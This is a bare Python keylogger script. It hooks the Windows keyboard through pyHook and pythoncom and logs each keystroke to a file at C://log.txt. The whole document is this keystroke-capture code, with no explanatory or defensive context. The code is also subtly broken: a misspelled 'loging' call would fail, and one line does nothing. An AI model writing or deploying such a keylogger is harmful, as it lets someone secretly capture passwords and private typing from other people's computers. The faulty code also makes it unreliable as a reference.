import pyHook , pythoncom , sys , logging

file_log = 'C://log.txt'

def onKeyBoardEvent (event) :
	logging.basicConfig(filename=file_log , level = logging.DEBUG , format='%(message)s')
	chr(event.Ascii)
	loging.log(10,chr(event.Ascii))
	return True

hooks_manager = pyHook.HookManager ()
hooks_manager.KeyDown = onKeyBoardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()